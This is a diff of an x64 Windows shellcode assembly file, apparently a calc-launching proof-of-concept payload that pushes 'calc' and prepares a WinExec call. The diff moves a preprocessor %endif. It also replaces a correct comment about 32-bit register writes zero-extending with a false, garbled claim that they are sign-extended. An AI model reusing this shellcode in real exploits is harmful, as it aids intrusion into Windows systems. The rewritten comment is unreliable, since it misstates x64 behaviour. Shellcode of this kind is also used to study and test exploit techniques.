@@ -11,19 +11,18 @@ SECTION .text
 %include 'type-conversion.asm'
 
 %ifndef PLATFORM_INDEPENDENT
-  global shellcode
-  shellcode:
-%endif
-
+global shellcode
+shellcode:
 %ifdef STACK_ALIGN
     AND     SPL, 0xF8
 %endif
+%endif
 
-; Note to self: instructions on 32-bit registers are automatically zero-extended to 64-bits.
-; This means LODSD will set the high DWORD of RAX to 0.
+; Note to SkyLined: instructions on 32-bit registers are automatically sign-extended to 64-bits.
+; This means LODSD will set the high DWORD of RAX to 0 of 0xFFFFFFFF.
     PUSH    BYTE 0x60                     ; Stack 
     POP     RDX                           ; RDX = 0x60
-    PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc\0\0\0\0"
+    PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc", 0
     PUSH    RSP
     POP     RCX                           ; RCX = &("calc")
     SUB     RSP, RDX                      ; WinExec messes with stack
